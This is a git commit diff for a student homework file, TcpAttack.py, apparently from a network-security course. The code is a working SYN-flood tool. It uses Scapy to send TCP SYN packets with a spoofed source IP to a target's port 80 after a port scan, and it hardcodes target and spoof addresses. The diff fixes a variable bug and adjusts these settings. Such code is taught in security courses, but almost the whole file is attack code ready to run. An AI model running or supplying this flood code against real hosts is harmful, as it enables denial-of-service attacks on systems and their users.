e267898cfa09c11056c2911de6c8d9603ce2d472
Dhruv Aggarwal <terrificplanes98@gmail.com>
2020-03-25 22:52:22 -0400

    Finished HW8

--- HW8/TcpAttack.py
+++ HW8/TcpAttack.py
@@ -28,36 +28,36 @@ class TcpAttack:
 
     def attackTarget(self,port,numSyn):
         sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
-        port = 0
+        testport = 0
         try:
             sock.connect( (self.target, port) )
-            port = 1
+            testport = 1
         except:
             pass
         #code from professor's downloadable code D0S5.py        
-        if port == 1:
+        if testport == 1:    
             for i in range(numSyn):
                 IP_header = IP(src = self.spoof, dst = self.target) 
                 TCP_header = TCP(flags = "S", sport = RandShort(), dport = port)
                 packet = IP_header / TCP_header
                 try:                                             
                     send(packet)
-                except Exception as e:                                                   
-                    print (e)
+                except:
+                    pass
             return 1
         else:
             return 0
 
 if __name__ == "__main__":
-    spoof = '11.33.38.186'
-    target = '128.46.4.83'
+    spoof = '192.168.0.25'
+    target = '128.46.4.88'
     start = 1
-    end = 45
+    end = 50
     port = 80
 
     tcp = TcpAttack(spoof,target)
     tcp.scanTarget(start,end)
-    if (tcp.attackTarget(port, 15)):
+    if (tcp.attackTarget(port, 10)):
         print ('port was able to be attacked')
     else:
         print ('port not able to be attacked')
